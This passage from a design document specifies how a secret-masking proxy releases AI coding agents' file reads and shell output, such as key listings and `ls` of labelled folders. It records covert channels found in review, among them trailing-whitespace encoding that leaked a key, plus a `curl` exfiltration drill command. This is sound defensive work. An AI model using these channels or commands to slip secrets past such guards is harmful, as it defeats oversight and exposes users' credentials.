  byte that holds no secret value, so the twin carried the comment verbatim and
  every rendering of the twin (Claude Code's Read, a `cat` through the
  exec-output rule) was "a registered line verbatim": masked whole, one
  `$MDU:nomodel_Read[…]` instead of the keys. Now a line of the base row's
  value is no fingerprint of that row when, trimmed, it is also a line of
  the file's OWN structured twin (rendered from that row's value and its
  field rows) AND it holds none of the file's secret texts (each field's
  value and the file's own spelling of it) and none of the row's other
  pieces (a credential-shaped span, a bare token, §11.15). Such a line holds
  no secret byte: the twin generator kept it as it is, and the agent is
  shown it in the twin anyway. The exclusion is made where the pieces are
  computed (`valueFingerprints`, keyed in the value index's piece cache), so
  the value backstop, the egress tripwire and the prompt filter agree.
  Since 2026-10-17 a proxy's own row on a registered file's path (a Read it
  masked whole) takes the same exception ("The registration is the twin's
  base" above). Everything else stays: the whole value, every value-bearing
  line, every field row. Fail-closed edges: a file with no structured twin (a document,
  an unknown shape, a field row gone) keeps every line; a comment that
  repeats a secret value is no longer carried verbatim (since 2026-10-09
  the generator replaces every occurrence, §2.4), so its raw line differs
  from the twin's and stays a fingerprint while the twin's Read is per
  key; a short value glued inside a longer word is left in place and its
  raw line of 24 or more characters stays a piece; since 2026-10-17 the
  twin's own release rules refuse any rendering carrying such a line,
  whatever its length (`holdsSecretText`; until then a glued line under the
  24-character floor was released by the Read). A BARE TOKEN that is a
  whole twin line as it is (trimmed, an `export ` before it allowed) and
  holds no secret text is no piece either (2026-10-17, review of !1621,
  `withoutTwinTokens`): `DATABASE_PORT=5432` is one bare token of a
  `.env`, and as a piece of the file it masked every Read and `cat` of the
  twin whole. A token that is only part of a twin line stays a piece, and
  so does one whose value part (after its first `=` or `:`) reads as a
  credential (`looksLikeSecretValue`; second review of !1621: a labelled
  INI's `api_note=<32 hex>` is raw in the twin under a key that does not
  look secret, the KNOWN LIMIT, and its Read must stay masked). The cost,
  left as it was: `REDIS_URL=redis://localhost:6379` or a YAML
  `url: redis://localhost:6379` still masks a Read of its twin. The secret
  values, their lines and every token holding a secret text stay pieces.
  Consequence
  for the egress tripwire: a request carrying such a line no longer trips
  it, which is right, since the agent holds that line already. Tests:
  `arbiter/test/unit/twin-line-fingerprint.test.ts`, the component test of
  the same name, `tests/stack/agent-read-twin.test.ts` (Claude Code's
  `Read` of a commented `.env`).
- **A symbol token is no fingerprint** (2026-10-08, `symbolTokensOnly` in
  `egress-fingerprint.ts`; confidentiality.md §4). A labelled DOCUMENT has
  no structured twin: its twin is the base row's token alone, so the
  release above never applies to a shell print of it, and `cat
  memo/brief.md` on Codex comes back masked whole under the path-derived
  precaution as a new row whose value is the runtime head plus the token
  (`Script completed\nWall time 0.5 seconds\nOutput:\n$MDU:anymodel_Read[2451]\n`).
  The token's line, 24 characters, was a line piece of that row (the line
  floor is 24), the row carries no binding (its origin is the command, not
  the file), and the egress tripwire blocked `curl --data-binary
  @memo/brief.md` to example.com, the file's bound host, which the
  per-symbol gate had released (drill conf-bound-host-release on Codex
  0.160, 2026-10-08; it passed on 2026-10-03, before a Codex call's
  relative paths were read in its working directory and the `cat` result
  was masked at all). Now a value, line or piece with no letter or digit
  outside its `$MDU:` tokens is no fingerprint, made where the pieces are
  computed (`valuePieces`, `lineFingerprints`) and for the whole value
  (`fingerprintableValue`, in `secretValueMatch` and the value index), so
  the tripwire, the value backstop and the prompt filter agree. Security
  argument: such a text holds no secret byte; each token is gated on its
  own row by the per-symbol gate (desymbolized only at that row's bound
  hosts, withheld elsewhere), which is the guarantee the tripwire only
  backs. A line with any letter or digit beside a token stays a piece, the
  raw value of every row still matches, and a raw copy of the document to
  an unbound host still trips. The result itself stayed masked whole (a
  utility question, not a leak: the model saw the new row's token rather
  than the twin's), settled by the next bullet. Tests:
  `arbiter/test/unit/symbol-token-fingerprint.test.ts`,
  `tests/stack/codex-twin-bound-host-egress.test.ts` (the drill's shape over
  the real openai-proxy, arbiter and net-proxy).
- **A document's own twin** (2026-10-12, design pass then build). A shell
  print of a labelled DOCUMENT was masked whole as a new row
  (`$MDU:anymodel_exec_command[…]`) whose value is Codex's head plus the
  document's token: a token for a token. The new row's origin is the
  command, so it carries none of the document's bindings, and the model
  never learns that the output is the document. Releasing it changes what
  the model sees, so the rule is the structured twin's above, each half
  made exact for a single token:
  - *Content* (`wholeFileTwinExecOutputPath`, claude-code-inbound.ts). The
    head, on a Codex result only, is parsed only by the arbiter's own exact
    grammar (`CODEX_TWIN_HEAD_SRC`, bounded: the exec head or the script
    cell's status head, the grammar the structured rule uses, *Codex's
    head* above; behind it a cell's printed result object is read by its
    `output` field, as above). After the head, the body must be EXACTLY the whole-file twin
    the guard serves for that file: one `$MDU:` token, then the file's own
    final line terminator (none, `\n` or `\r\n`, confidentiality.md §7.2)
    or nothing (a runtime that trims the last newline, Claude Code's Bash).
    The token must be (`wholeFileTwinOfBase`, registry.ts) an active BASE
    row the registry minted from a labelled file (tool `Read`, no field, no
    call id, trusted, a secret level, its origin the path), and that row's
    own value must make the whole-file twin under the label in force
    (`twinFormOf`: no shape, or a shape that found no secret value and is
    not an exhaustive one on the catalog's word, that word read under the
    arbiter's HOME and every HOME the human plane named, `twinMatchOf`,
    §11.13 "The launch's HOME"). A file whose twin is
    structured or its own text never answers, since the guard never serves
    its base token alone. The guard keeps no per-call record of which twin
    it served, so "the bytes the guard served" is checked as the bytes it
    serves for that path: the twin is a function of the registered row.
  - *Evidence*: the structured rule's, unchanged and shared. `callTaint`
    answers only for a tree the guard recorded (a root, bound by the call's
    recorded command or, when it could not bind, matched while the session
    holds no raw read at all, plan 13 D7) in which no process opened a
    secret raw, and never for an unmapped tool.
  - *Release* (both proxies, `secretTaintFor`): `twinOf: [path]` with
    `twinWhole: true`. With a clean value backstop the path-derived level is
    lowered as for the structured twin, the output is forwarded as received
    (Codex's head, the token, the terminator), and the `twin:` line, byte
    for byte the same in both proxies, says: "this is `<path>` as you see
    it: the whole file is one symbol. Use the symbol where the file's
    content belongs (a command that sends it is checked against the file's
    rules); the user sees the real content."

  *What stays masked whole* (no answer; the path-derived precaution
  stands): a partial print that cuts the token (`head -c 12`, `cut`); any
  byte beside the twin (`cat -n`'s gutter, `cat brief.md; echo done`, a
  banner, a second newline); two files (`cat brief.md plan.md`: each token
  would be just as harmless, but one answer names one file and one twin,
  the shape the structured rule keeps too, so the wider case waits for a
  need); a print that found nothing (`grep Deal brief.md` prints nothing,
  since the twin holds no word of the document: no token, no answer); a
  field token, an unknown or obsolete one; a tree with a raw read (rule
  (i)); a call no recorded tree answers for. A print that keeps the whole
  twin is the twin, whichever program made it (`head -1`, `tail`, `sort`,
  `grep MDU`).

  *Why no secret byte can reach the model.* The forwarded text is the head
  and one token. The head's grammar admits digits, a hex chunk id and a
  status word from a closed set. The token is a name the arbiter drew at
  random (`randomHash4`), never derived from the file's bytes, and the
  terminator is one of three fixed strings, the file's own: one bit of
  shape that the twin on disk already gives every program the agent runs.
  A program that read the real bytes could choose what to print, and so
  spell out bits of the document in its choices (print or not, exit code,
  timing in the head); such a tree never answers (the evidence half), so
  every release comes from programs that saw the twin alone. The token is
  no new reach either: it is in the twin on disk, an indirect print that
  names no labelled path (`cp brief.md /tmp/x; cat /tmp/x`) was already
  forwarded in clear, and every use of it is gated on its own row, which
  carries the document's law: desymbolized only at the file's bound hosts,
  withheld elsewhere (confidentiality.md §2). *The tripwire*: a released
  result mints no row, so there is nothing to fingerprint; a token-only
  text is no fingerprint (the bullet above); the document's raw bytes stay
  fingerprinted by its base row, so a raw copy to an unbound host still
  trips.

  Claude Code's Bash `cat` of the document takes the same answer (the
  arbiter's test is shared), and so does Goose's `shell` `cat` (Goose has
  no read tool). Tests:
  `arbiter/test/unit/exec-output-twin.test.ts` and the component test of
  the same name (the document's twin, the shapes that fail, no evidence, a
  tainted tree, a structured file's base token), both proxies'
  `test/unit/rewrite-request.test.ts` (the line, byte-identical; a backstop
  hit), and `tests/stack/codex-document-twin.test.ts` (the real openai-proxy
  over HTTP with the guard's records: the document's own token, its law at
  the bound host, Claude Code's Bash, the negatives masked whole, and the
  oracle: no byte of either document reaches any model request).

  *The read leg* (2026-10-12, the question the shell leg left open). A
  built-in read of the document (Claude Code's `Read`, OpenClaw's and
  OpenCode's `read`) was re-symbolized under `secrets` as a new row
  (`$MDU:anymodel_Read[new]`) whose value is the twin token: that row sat
  on the file's path, so it carried the bindings, but the model still saw a
  token for a token. Now a read whose rendering is EXACTLY the document's
  whole-file twin classifies `public` (a confidentiality verdict, beside the
  structured read-twin's; policy-interface.ts `isWholeFileTwinRead`), so
  the rendering reaches the model as received: the document's own token.
  - *Which twin.* The path is the one the call named, resolved as the
    structured read rule resolves it (absolute; OpenClaw's relative path in
    its launch directory). The token must be the path's twin as served
    now: the NEWEST active base row the registry minted for that path, with
    no call id (a proxy's own Read row is never one), whose own value makes
    the whole-file twin (registry.ts `wholeFileTwinFor`; the launcher
    registers with no session key, so every launch serves that row). A
    token of another file, of an older registration of the same path, a
    field token or a forged one does not pass. The agent's own process is
    served the twin whatever a reader list says, so the read's bytes
    are the twin; the content test only checks they are exactly it.
  - *Which rendering.* Claude Code (its own `Read` spec entry only):
    `claudeReadWholeFileToken`, line 1 holding the one token and nothing
    else, a `\r` after it only for a CRLF file, then at most the harness's
    empty row 2 and only for a file that ends in a terminator; trailing
    spaces, tabs and newlines are framing; any other line number (an offset
    read), line or byte fails. OpenClaw and OpenCode (1 and 2): their frames
    stripped by the parsers the structured rule pins
    (`openclawReadRenderingText`, `opencodeReadRenderingText`, an OpenCode
    frame naming only the call's own path), then the text must be the token
    alone (`wholeFileTwinTextToken`); those renderings carry no terminator
    to compare. A `read` reached through `tool_call`, and every other shape,
    keeps the document's label and is masked whole as before.
  - *Why it cannot leak.* The same argument as the shell leg, with no
    process tree to weigh: the forwarded rendering is a gutter (digits and a
    separator) or a frame the pinned parser accepted (the call's own path,
    digits, fixed words) and one name drawn at random. The value backstop in
    the classify op still runs (raise-only); a token-only text is no
    fingerprint. The token's every use is gated on its row, which keeps the
    document's level and bindings (desymbolized only at its bound hosts).
  - *Fail-closed edges.* A document re-registered under a new text after a
    launch shows that launch's agent the older token on disk; that Read is
    no longer the newest twin and stays masked (utility, not a leak).
    Where no twin is served at all (a launch with neither the bind nor the
    guard, the `gated` posture), the read returns the raw document, which
    is no token and stays masked.

  Tests: `arbiter/test/unit/read-document-twin.test.ts` (the Claude
  rendering's grammar and misses, each agent's read through the classify,
  `wholeFileTwinFor`: the newest row, a proxy row excluded, a structured
  file), `tests/stack/read-document-twin.test.ts` (the real anthropic-proxy
  over HTTP: Claude Code's `Read`, OpenClaw's, OpenCode 1's and 2's `read`
  and Goose's `cat` reach the model as the document's own token; the raw
  document, an extra line, two tokens, a stray `\r`, another document's or
  an older registration's token, an offset read stay masked whole; the
  token keeps its law; the oracle: no document byte reaches the model).
- **A key listing** (2026-10-16, found in a live demo run:
  demo-api-401-debug, Claude Code 2.1.301 with Sonnet, mode `secrets`;
  first shipped as "a names-only listing", tightened after an adversarial
  review of !1604 the same day). Debugging an empty-key 401, the model ran
  `cd shop-app && sed 's/=.*//' .env`, saying it wanted the variable NAMES
  without the values. `sed` was served the twin, so it printed
  `STRIPE_SECRET_KEY\nPORT`. That output has no token, so the structured
  rule above (which finds the file by its tokens) never answered. The
  command names `.env`, so the path-derived precaution masked it whole, and
  the model gave up and asked the user. A third content rule beside the two:
  - *Content* (`structuredTwinKeyListingPath`, `keyListingLines`,
    claude-code-inbound.ts). On a Codex result only, after Codex's own head
    (*Codex's head* above: one, at the start, bounded; a cell's printed
    result object read by its `output` field, canonical JSON only), the
    text loses at most ONE final newline and nothing else. It is at most 16 KiB (`KEY_LISTING_OUTPUT_MAX`), holds NO
    token (no `$MDU:`, no encoded one), and is a strict in-order projection
    of ONE twin. Walking the twin's lines in order, each output line is
    EXACTLY one of the fixed forms of the next twin line it stands for:
    - its KEY PART, the text before that line's first `=` or before its
      first `:` (when that comes before the line's first token), in one of
      three spellings: as written (`cut -d= -f1` keeps `KEY ` of
      `KEY = v`), with its trailing blanks trimmed (`awk -F' = '`), or with
      the separator (`grep -o '^[^=]*='`). Both separators count, so
      `cut -d= -f1` and `cut -d: -f1` pass; an `.npmrc`'s
      `//host/:_authToken=` has both;
    - or, for a line holding no token, the line itself (a comment, or
      `PORT=4242` that `sed` leaves as it is).

    A CRLF twin line also passes with its one `\r`. Twin lines holding no
    token may be skipped (`grep -v '^#' | cut -d= -f1`). A line holding a
    token may NOT be skipped, and stands only as a non-empty key part, so at
    least one output line names a secret's key. The walk tracks a set of
    positions, not a greedy pointer, so a comment that reads like a key
    never takes the key's place. No form reaches into one of the file's
    secret texts (`structuredTwinWithSecretsFor`) or holds one of its base
    row's pieces whole; see below. `sed 's/=.*//' .env`, `cut -d= -f1 .env`,
    `awk -F= '{print $1}' .env` and `grep -o '^[^=]*' .env` pass, `export
    KEY=` lines included (the key part is `export KEY`).
  - *Exact bytes* (review of !1604). The first build trimmed all trailing
    whitespace, per line and at the end, before comparing, while the
    proxies forward the bytes as received. Spaces, tabs, U+00A0 or U+2003
    at line ends, or in trailing blank lines, could then carry a value at
    about 2 bits a character: the review's probe released a 33-character
    key with no backstop hit. Every form is now a fixed string the twin
    gives, and only one final newline is framing. The structured rule above
    had the trailing form of the same channel (`.replace(/\s+$/, "")` before
    the substring test); it now drops at most one final newline too. The
    cell object must be canonical (`JSON.stringify`, compact or 2-space
    indent), since `JSON.parse` takes any whitespace between tokens. The
    second pass found the head was the same channel in digits, on every
    agent (*Codex's head* above): no head is looked through but Codex's
    own, bounded.
  - *Which file* (review of !1604). Only a file the call's COMMAND names is
    a candidate (`keyListingCandidates`): a word of the command (the proxy
    sends it as `command`) resolved to a registered path. It counts when it
    is absolute or `~/…`, or relative to the directory the shell is in AT
    THAT POINT of the command: where the call started (the guard's
    `callStartDir`), moved by each `cd`/`pushd` in order (second pass: the
    first build resolved every word against the start directory AND every
    `cd` target, so `cd shop-app && sed … .env` named nothing when both
    `./.env` and `./shop-app/.env` were registered). Conservative: a
    `(…)` subshell's `cd` ends with it, a `cd` in a pipeline or background
    job changes nothing after it, and a `cd` followed by `||`, with no
    target, `cd -` or a target holding an expansion makes the directory
    unknown, so no word after it names a file; a word holding an expansion,
    a glob or `=` is no path word. With the start directory known, the
    exact tier is the only one. Without it, the tiers are a relative word
    read after a `cd` joined to that relative target (`cd shop-app && …
    .env` names `…/shop-app/.env`), then a relative word read where the
    command started, as a path suffix. The first tier with a match names its file only when
    exactly ONE of its files matches; two matches are ambiguous and name
    nothing. Before, the first matching twin across the whole registry was
    named, so a home-wide `.env` with the same keys could win, pointing the
    model at another project's secret file. The registered paths are cached
    until the symbol table changes, and are read only for a result that
    already parses as a listing. A twin is rendered only for a named file.
  - *Evidence*: the other twin rules', unchanged and shared (`callTaint`:
    a tree the guard recorded, no raw open of a secret in it, a mapped
    tool). The answer is `twinOf: [path]` with `twinKeys: true`.
  - *Release* (both proxies, `secretTaintFor`).
    - *Sending the output.* `mayBeTwin` sent the output only when it held a
      token. A token-free output now rides too when the call has a command
      and the output passes a cheap screen (`mayBeKeyListing`): at most
      16 KiB, no `$MDU:`, and at least one line shaped like a key part. That
      is one word that starts like a key (a letter, `_`, a quote, `/`, `@`
      or `.`, never a number) and holds no `=`, after optional indentation
      and `export `, then at most a separator. On Codex the screen looks
      after the exec head, whose `Output:` line would pass anything, and a
      cell's printed object rides as it is.
    - *Why a screen.* It is traffic only, never a check. `callTaint` is
      asked before the classify (the ask binds the call), so whether the
      path-derived mask will apply is not yet known. The screen keeps prose,
      logs, `KEY=value` lines and anything bigger off the socket.
    - *The release.* With a clean value backstop the path-derived level is
      lowered as for the structured twin, and the output is forwarded as
      received, which the exact-bytes rule above makes the twin's own bytes.
    - *The `twin:` line* (Claude Code): "these are the key names in
      `<path>`, and the lines of it that hold no masked value, as you see
      the file; no masked value is in this output. Read the file (or cat it)
      to see each masked value as a symbol, and use the symbol where the
      value belongs (a command that sends it is checked against the file's
      rules); the user sees the real values." The first wording said "no
      value is in this output", which was false: token-free lines pass
      verbatim, their values included. The openai-proxy's line says "Print
      the file (cat it)" in place of "Read the file (or cat it)", since
      Codex has no read tool. Each line is pinned in its proxy's tests.
    - *Nothing masked.* When the classify verdict masked nothing (the
      command names no secret path: `echo STRIPE_SECRET_KEY` in a clean tree
      can match too), there is nothing to lower. The proxy drops the release
      and its line, so a result that merely reads like keys is forwarded as
      it is, with no note.

  *What stays masked whole* (no answer; the path-derived precaution
  stands):
  - a value (`STRIPE_SECRET_KEY=sk_…`), a key cut short, or a cut past the
    separator;
  - a reordered listing (`sort`);
  - a listing that leaves out a token-bearing line (`grep DATABASE | cut`,
    `head -3 | cut`), or one that names no secret key at all (`PORT` alone,
    a comment alone);
  - two files (`cut -d= -f1 .env credentials`);
  - a byte the twin does not give: a gutter, a leading space, a line twice,
    `; echo done`, trailing whitespace, a second final newline, a stray
    `\r`;
  - a token or an encoded one;
  - a `cut -d: -f1` whose first `:` is inside a token (`KEY='$MDU`);
  - a listing that needs a form reaching into a secret text, or holding
    a piece of the file;
  - a file the command does not name, or two named files that both match;
  - a tree with a raw read (rule (i)), or a call no recorded tree answers
    for;
  - an output over 16 KiB.

  *What the model can learn, and why no secret byte reaches it.*
  - *Twin content only.* Every released byte after Codex's own head (on a
    Codex result) is twin content: a fixed prefix of a twin line that ends
    before its first token, or a token-free twin line verbatim, in the
    twin's order. The twin generator replaces every occurrence of each
    extracted value (§2.4).
  - *The glued short value.* The one exception the generator leaves is a
    short value glued inside a longer word (`DB_PASSWORD=x9k2q` beside
    `MY_x9k2q_SERVICE_ENDPOINT_URL=…`). A `Read` or `cat` of such a twin is
    masked whole when that line is 24 characters or more, by the line
    fingerprint. This listing would not be: a key part is only a prefix of
    the line, and the value backstop matches a fingerprint, not a prefix of
    one, so the first build released `MY_x9k2q_SERVICE_ENDPOINT_URL`
    (review of !1604). Since 2026-10-17 (`keyListingForms`), every form is
    a prefix of its line that ends at or before the line's first secret
    text (the twin's own tokens set aside): `MY_x9k2q_SERVICE_ENDPOINT_URL`
    has no form, `MODE=owlish` beside `DB_PASS2=owl` stands as `MODE` or
    `MODE=` (a name with no secret byte), never as itself. The first fix
    gave such a line no form at all, which failed every listing of a file
    with a glued line (`cut -d= -f1` prints `MODE`), and a Read of that file
    is masked whole now ("A glued short value", §2.4), so the names were the
    one view left. A line left with no form can only be skipped
    (token-free) or fails the listing (token-bearing).
  - *A comment line may always be skipped* (review of !1621). The credential
    belt puts tokens into comments (`# backup password $MDU:…cred.token`);
    such a line has no key part, and as a token-bearing line that may not be
    skipped it failed every listing of its file. A whole-line comment
    (`#`, `;`, `//`) is now never required; one with a key part
    (`# OLD_STRIPE_KEY=$MDU:…`) may still stand as it (`# OLD_STRIPE_KEY`).
  - *No form holds a piece* (the reviewer's hardening of !1604,
    2026-10-17). The callTaint asks the registry for the file's base-row
    pieces (`structuredTwinWithSecretsFor` with `pieces`: the value
    backstop's, a file row's bare tokens included), and a form that holds
    one whole has none. After the credential belt (§2.4) the twin carries
    no detector span and no comment token, so this bites on a key name that
    is itself a random-looking token (`Tq7vZ2pX9kLm4Rw8: true`). It is
    per form, not per line as the review proposed: a dotenv line's bare
    token runs past its key, and the pieces that stay in a twin line are
    such tokens holding a glued secret text (`SERVICE_ID=k9z48172635`
    beside `DB_PASS=k9z`; a bare token the twin shows with no secret text,
    a whole twin line, `DATABASE_PORT=5432`, is no piece since the review
    of !1621). A
    line-level rule would refuse `SERVICE_ID`, a name that holds no secret
    byte; the form check already stops at the glued text.
  - *More than a Read shows.* This release can show key names a `Read` hid.
    Claude Code's `Read` of a registered `.env` often comes back as ONE
    whole-file symbol (147 times in the live logs, review of !1604). A
    command that does NOT name the file
    (`cat ./.e*`, a copy) already shows the twin's keys and its token-free
    lines in clear, so a key listing gives the model nothing such a command
    could not. It does give it through a command that names the file, which
    before this rule was masked whole.
  - *Little to choose.* The in-order projection leaves a program little to
    choose: per twin line, skip it (token-free lines only) or print one of
    a few fixed forms. On Codex the head in front carries Codex's own
    bounded values (a chunk id it drew, and the run facts every released
    result carries); on any other agent no head passes at all. A program that had read the real bytes could encode
    a few bits per line by those choices, not a value's text. The evidence
    half answers only for a tree in which no program read the file raw. The
    released result mints no row (nothing to fingerprint), and the file's
    raw bytes stay fingerprinted by its base row.
  - *The KNOWN LIMIT* (`tests/stack/labelled-data-file-twin.test.ts`; plan
    16 §1.2). A person-labelled JSON, YAML, TOML, INI or XML file, or a
    labelled dotenv, keeps the values Mandu does not recognize as secret
    (`ssn`, `wages`, `FILING=joint`) as written in its twin. Those lines
    hold no token, so a key listing may print them verbatim. That is the
    same exposure the structured rule above already gives (`cat
    return.yaml` in a recorded clean tree prints the whole twin), and the
    same as a `Read` of the copy or a command that does not name the file.
    The KNOWN LIMIT test pins that a command naming the file is masked
    whole only because it has no guard record. The fix is plan 16's
    document twin, under which every value of a labelled data file is a
    symbol, so these lines would hold tokens and stand only as key parts.

  Tests:
  - `arbiter/test/unit/exec-output-key-listing.test.ts`, the content rule:
    the four commands' outputs, a commented `.env`, `export` lines, an
    `.npmrc` and an INI file in each spelling, Codex's head and the
    canonical cell object; the whitespace encodings (a trailing space, a
    tab, U+00A0, U+2003, two final newlines, a blank line of spaces, a
    stray `\r`) and a CRLF file; the structured rule's trailing whitespace;
    the glued short secret; the value, sort, partial, two-file, token,
    encoded-token, extra-byte, empty and oversized misses; the walk is not
    greedy; `keyListingCandidates` tiers, and the rule naming the file the
    command names over a home-wide `.env` with the same keys; each word read
    where the command is at that point (`cd` in order, subshells,
    pipelines, background jobs, `||`, a target or word with an expansion);
    a forged head (on another agent, past the bounds, a second head).
    `arbiter/test/unit/exec-output-twin.test.ts`: the same head rules for
    the structured and whole-file rules and the cell object's bounds.
  - The component test of the same name, through `callTaint`: `twinKeys` on
    evidence; no record, a raw read in the tree, the misses and the axis off
    answer nothing; a file registered later is found; the whitespace
    encodings; the glued value through the real registration; a command
    naming no file; two projects' `.env` with the same keys, each named
    only by its own command, and neither for a bare `.env` with no start
    directory; a masked Read's row does not shadow the registration. The
    component `exec-output-twin.test.ts`: a Codex head is looked through
    only with `codexHead`, and never twice.
  - Both proxies' `test/unit/rewrite-request.test.ts`: the release and its
    line, the screen, a backstop hit, no answer, no mask to lower, a taint;
    the openai-proxy sends `codexHead`, the anthropic-proxy never does.
    `tests/stack/proxy-real-client-parity.test.ts`: `output` and
    `codexHead` ride the real client's opts.
  - The dashboard's `secret-note.test.ts`: the line gives no mask cause.
  - `tests/stack/exec-output-key-listing.test.ts`, the real arbiter and both
    proxies over HTTP with the guard's records. The listing reaches Claude
    Code and Codex with the line, naming the file the command names while
    another project's `.env` is registered. Whitespace carrying the key's
    bits, a Codex-shaped head on Claude Code (well-formed, or the key as
    digits), no record, a sorted listing and a raw-read tree each stay one
    symbol. The oracle: the value is in no request to the model.
- **A folder's names** (2026-10-17, found in a live demo run: demo-c2,
  mode `secrets`). Asked to go through an inbox, the model ran
  `ls mail/inbox bank/`. `bank/` is labelled `no-model` (recursive), so the
  command names a secret path and the path-derived precaution masked the
  whole listing: the model saw one symbol where an unlabelled folder shows
  its file names, and could not tell which statements there were. A label
  protects what a file HOLDS; a folder's entry names are metadata the
  model does not cover (plan 13 §4.9: names are a channel left open, and a
  command that does not name the folder, `find .`, already prints them in
  clear). A fourth content rule beside the three twin rules:
  - *Content* (`plainLsListingPaths`, policy/dir-listing.ts). The call's
    command is ONE plain `ls` (`plainLsCommand`): no other command and no
    `;`, `&&`, `||`, `|`, `&`, subshell, redirection, expansion, glob,
    brace, comment, escape or assignment anywhere in it; `ls` as the first
    word exactly; only the options `-1`, `-a`, `-A` (any cluster),
    `--all`, `--almost-all`, `--color=never|auto` (and their spellings)
    and `--`; at least one operand. Every operand resolves (absolute,
    `~/…`, or relative to the directory the guard says the call's shell
    started in, `callStartDir`) to an existing path, no two to the same
    one. The output, framed as the key listing frames it
    (`keyListingLines`: on Codex after Codex's own head, at most one final
    newline, at most 16 KiB, no token or encoded token, not empty), is
    EXACTLY what `ls` prints to a pipe for those operands now: the file
    operands as written, then for each folder (after a blank line when
    anything came before, under a `<operand>:` header when there is more
    than one operand) every entry `readdir` gives, each once, hidden ones
    per `-a`/`-A`, `.` and `..` with `-a`. The arbiter reads the folders
    itself (`hostListingFs`: it runs as the user, outside the sandbox, and
    only compares; a name reaches the model only when the output already
    holds it). Order: one of two, for the whole output: byte order (uutils
    `ls`, GNU `ls` under any `C` locale) or the order GNU `ls` gives under
    `en_US.UTF-8` (punctuation ignored; `Intl.Collator("en",
    {ignorePunctuation: true})`, measured equal on GNU coreutils), names
    the order holds equal in either order. A folder with a name that is not
    plain UTF-8 or holds a control character (a newline would split one
    name over two lines), or with more than 4096 entries, is never matched.
  - *Which command.* The operands are read off the command the proxy sends
    (`command`); when the proxy recorded a command for the call
    (`recordCallCommand`) the two must have the same signature, else no
    answer.
  - *Evidence*: the twin rules', unchanged and shared (a tree the guard
    recorded, no raw open of a secret in it, a mapped tool). The answer is
    `twinOf: [the folders, then the files listed]` with `dirListing: true`.
  - *Release* (both proxies, `secretTaintFor`). The output rides to
    `callTaint` when the command starts with the word `ls` and the output is
    token-free and at most 16 KiB (`mayBeDirListing`, a traffic screen
    only; a listing whose names start with a digit fails the key screen).
    With a clean value backstop the path-derived level is lowered as for
    the twin rules and the output is forwarded as received, with a
    `listing:` line (byte-identical in both proxies): "these are the names
    in `<paths>` as ls printed them, and nothing else: no file's content,
    size or date. The files there may still be secret: reading one shows you
    a symbol where its secret content is." With nothing masked (a folder no
    label covers) there is nothing to lower and no line.

  *What stays masked whole* (no answer; the path-derived precaution
  stands):
  - every option that prints metadata or reads deeper: `-l` (and `-la`,
    `-lh`), `-s`, `-i`, `-t`, `-S`, `-r`, `-F`, `-p`, `-R`, `-d`,
    `--full-time`, `--color=always`. A long listing prints each file's size,
    owner and date, and what a size tells is an open question of its own (a
    program served the twin sees the twin's size, while the guard-only
    posture still says the real one to some `stat`s: plan 13 §4.9,
    confidentiality.md §7.2a "The size a reader sees"), so `-l` stays
    masked until that is settled; the names alone are what the model needs
    to choose a file;
  - a chain, a pipe or a list around the `ls` (`ls bank && cat
    bank/x.md`, `ls bank | head`, `ls bank; cat x`), even when the output
    is the names alone: a compound command releases nothing it did not
    before (since 2026-10-18, except one plain `ls` at either end of a
    compound whose other parts are allow-listed programs that name no
    secret path, computed in the classify op with the clean-tree release's
    evidence: [folder-listing-compound.md](./folder-listing-compound.md));
  - any byte no entry name gives: a content line, a gutter, trailing
    whitespace, a CR, a second final newline, an error line (`ls: cannot
    access …`), a column layout (an `ls` writing to a terminal);
  - a name missing or twice, a reordered listing, a header where `ls`
    prints none or none where it prints one;
  - a relative operand with no start directory, a `~user` operand, a
    missing operand, the same folder twice;
  - a name holding a registered value (the value backstop), or a token;
  - a tree with a raw read (rule (i)), or a call no recorded tree answers
    for; an echoed command that is not the one the proxy recorded.

  *What the model can learn, and why no secret byte reaches it.* Every
  released byte is an entry name the named folder holds now, an operand the
  model wrote, a `:` header or a blank line, in an order fixed up to two
  choices: no byte of any file's content, and none of its size, date, mode
  or owner. The names are the open channel plan 13 §4.9 and §9 R4 accept (a
  vetted reader that read a secret could name a file after it), and
  `find .` already shows them; the value backstop still catches a
  registered value in a name. The evidence half answers only for a tree
  that read no secret raw. The open question of a secret in a created
  file's NAME (the directory and name flow, plan 13 §9 R4) is not widened:
  such a name reaches the model today through any command that does not
  name the folder.

  *Not covered* (masked as before, utility only): `cd bank && ls`, `ls`
  through an alias that adds options, Codex's `exec_command` with a
  terminal (`tty: true`, columns), `find bank -maxdepth 1`, `tree`, and
  Claude Code's own `LS`/`Glob` tools (their own legs, unchanged).

  Tests:
  - `arbiter/test/unit/dir-listing.test.ts`: which commands parse (options,
    quotes, `--`) and which do not (metadata options, chains, pipes,
    redirections, expansions, globs, comments, assignments, another
    program); the demo listing; `-a`/`-A`; file operands, empty folders,
    headers and blank lines; both orders and no other; the misses (a chain
    with `cat`, `ls -l`, a content line, a missing or doubled name, trailing
    whitespace, a CR, a header too many or too few, a token, an error line,
    a column layout, over 16 KiB); the start directory, `~user`, a control
    character in a name; the host view (a symlinked folder, a non-UTF-8
    name); Codex's head only with `codexHead`.
  - `arbiter/test/component/dir-listing.test.ts`, through `callTaint` with
    real folders: `dirListing` on evidence, a name created since; no
    record, no start directory, the misses, an echoed command that is not
    the recorded one, a raw read in the tree, the axis off answer nothing.
  - Both proxies' `test/unit/rewrite-request.test.ts`: the release and its
    line, the screen, a backstop hit, no answer, no mask to lower, a taint.
    The dashboard's `secret-note.test.ts`: the line gives no mask cause.
  - `tests/stack/exec-output-dir-listing.test.ts`, the real arbiter and
    both proxies over HTTP with the guard's records and a real `ls`: the
    demo's `ls mail/inbox bank/` reaches Claude Code and Codex with the
    line; `ls -la`, a chain with `cat`, a pipe, an appended statement line,
    a missing name, no record, a raw-read tree and a name holding a
    registered value stay one symbol. The oracle: no statement byte and no
    registered value is in any request to the model.
- **Other agents' `read`.** The structured read-twin rule covers OpenClaw's
  and OpenCode's own `read`, keyed by spec identity like Claude's, with the
  agent's rendering stripped by a parser pinned to its published source
  before the shared content test (`isStructuredTwinText`;
  `openclawReadRenderingText`, `opencodeReadRenderingText`). Any other
  shape keeps the whole-result mask; a `read` reached through `tool_call`
  stays masked. A relative path (OpenClaw's model writes
  `read {path: ".env"}`) is looked up in the launch directory, as the
  classify resolves it (`relativePathBase`; 2026-10-11, confidentiality.md
  §6): before, only an absolute path found the twin, and such a read went
  to the model as one whole-file handle.

Scope: a confidentiality release only. Under `full` the integrity axis
still treats a shell result as untrusted. The rule does not rewrite a
reader's raw output into per-value symbols: rule (i) stays whole-result,
